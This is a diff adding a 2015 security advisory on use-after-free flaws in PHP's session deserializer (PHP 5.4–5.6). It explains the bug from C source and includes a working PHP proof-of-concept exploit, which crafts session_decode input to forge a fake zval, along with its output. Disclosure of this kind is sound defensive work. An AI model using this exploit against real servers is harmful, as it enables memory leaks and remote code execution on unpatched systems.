@@ -1,0 +1,125 @@
+Use After Free Vulnerabilities in Session Deserializer
+
+Taoguang Chen <[@chtg](http://github.com/chtg)> 
+Write Date: 2015.8.9
+Release Date: 2015.9.4
+
+Multiple use-after-free vulnerabilities were discovered in session deserializer (php/php_binary/php_serialize) that can be abused for leaking arbitrary memory blocks or execute arbitrary code remotely.
+
+Affected Versions
+------------
+Affected is PHP 5.6 < 5.6.13
+Affected is PHP 5.5 < 5.5.29
+Affected is PHP 5.4 < 5.4.45
+
+Credits
+------------
+This vulnerability was disclosed by Taoguang Chen.
+
+Description
+------------
+
+PS_SERIALIZER_DECODE_FUNC(php) /* {{{ */
+{
+
+  ...  
+
+  PHP_VAR_UNSERIALIZE_INIT(var_hash);
+
+  p = val;
+
+  while (p < endptr) {
+    
+    ...
+
+    if (has_value) {
+      ALLOC_INIT_ZVAL(current);
+      if (php_var_unserialize(&current, (const unsigned char **) &q,
+(const unsigned char *) endptr, &var_hash TSRMLS_CC)) {
+        php_set_session_var(name, namelen, current, &var_hash  TSRMLS_CC);
+      }
+      zval_ptr_dtor(&current);
+    }
+    PS_ADD_VARL(name, namelen);
+skip:
+    efree(name);
+
+    p = q;
+  }
+break_outer_loop:
+
+  PHP_VAR_UNSERIALIZE_DESTROY(var_hash);
+
+  return SUCCESS;
+}
+
+
+When session deserializer (php/php_binary) deserializing multiple data
+it will call to php_var_unserialize() multiple times. So we can create
+ZVAL and free it via the php_var_unserialize() with a crafted
+serialized string, and also free the memory (reduce the reference
+count of the ZVAL to zero) via zval_ptr_dtor() with deserialize two
+identical session data, then the next call to php_var_unserialize()
+will still allow to use R: or r: to set references to that already
+freed memory. It is possible to use-after-free attack and execute
+arbitrary code remotely.
+
+In some other cases, session deserializer
+(php/php_binary/php_serialize) may also lead to use-after-free
+vulnerabilities: i) via crafted Serializable::unserialize() ii) via
+unserialize()'s callback function and zend_lookup_class() call a
+crafted __autoload().
+
+Proof of Concept Exploit
+------------
+The PoC works on standard MacOSX 10.11 installation of PHP 5.4.44.
+
+
+<?php
+
+session_start();
+
+$fakezval = ptr2str(1122334455);
+$fakezval .= ptr2str(0);
+$fakezval .= "\x00\x00\x00\x00";
+$fakezval .= "\x01";
+$fakezval .= "\x00";
+$fakezval .= "\x00\x00";
+
+$exploit = 'ryat|a:2:{i:0;i:1;i:1;a:1:{i:1;chtg|a:1:{i:0;R:4;}';
+// $exploit = 'ryat|a:1:{i:0;i:1;}ryat|i:1;chtg|R:1;';
+session_decode($exploit);
+
+for ($i = 0; $i < 5; $i++) {
+    $v[$i] = $fakezval.$i;
+}
+
+var_dump($_SESSION);
+
+function ptr2str($ptr)
+{
+  $out = "";
+  for ($i = 0; $i < 8; $i++) {
+    $out .= chr($ptr & 0xff);
+    $ptr >>= 8;
+  }
+  return $out;
+}
+
+?>
+
+
+Test the PoC on the command line:
+
+
+$ php uafpoc.php
+array(2) {
+  ["ryat"]=>
+  NULL
+  ["chtg"]=>
+  array(1) {
+    [0]=>
+    int(1122334455)  <===  so we can control the memory and create fake ZVAL :)
+  }
+}
+
